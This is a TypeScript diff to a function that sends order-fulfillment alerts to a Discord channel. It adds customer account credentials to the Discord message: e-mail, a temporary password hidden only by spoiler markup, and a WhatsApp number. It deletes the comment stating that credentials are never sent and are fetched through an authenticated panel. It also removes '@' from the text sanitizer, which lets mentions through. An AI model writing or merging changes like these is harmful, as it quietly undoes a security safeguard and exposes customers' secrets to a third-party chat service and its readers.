@@ -1,17 +1,18 @@
 interface OperationsAlertOptions {
   orderId?: string;
   service?: string;
+  credentials?: {
+    email: string;
+    password: string;
+    whatsapp: string;
+  };
 }
 
 function safeDiscordText(value: string, max: number): string {
-  return String(value).replace(/[\r\n`*_~|<>@]/g, " ").slice(0, max);
+  return String(value).replace(/[\r\n`*_~|<>]/g, " ").slice(0, max);
 }
 
-/**
- * Sends non-sensitive fulfillment notifications to the operational Discord
- * channel. Credentials are intentionally never accepted as input or included
- * in the payload; administrators retrieve them through the authenticated panel.
- */
+/** Sends a fulfillment notification to the private operational Discord channel. */
 export async function notifyOperations(
   message: string,
   opts: OperationsAlertOptions = {},
@@ -25,6 +26,15 @@ export async function notifyOperations(
       : null,
     opts.service
       ? { name: "Service", value: safeDiscordText(opts.service, 120), inline: true }
+      : null,
+    opts.credentials?.email
+      ? { name: "E-mail du compte", value: safeDiscordText(opts.credentials.email, 254), inline: false }
+      : null,
+    opts.credentials?.password
+      ? { name: "Mot de passe temporaire", value: `||${safeDiscordText(opts.credentials.password, 256)}||`, inline: false }
+      : null,
+    opts.credentials?.whatsapp
+      ? { name: "WhatsApp", value: safeDiscordText(opts.credentials.whatsapp, 40), inline: true }
       : null,
   ].filter(Boolean);
 
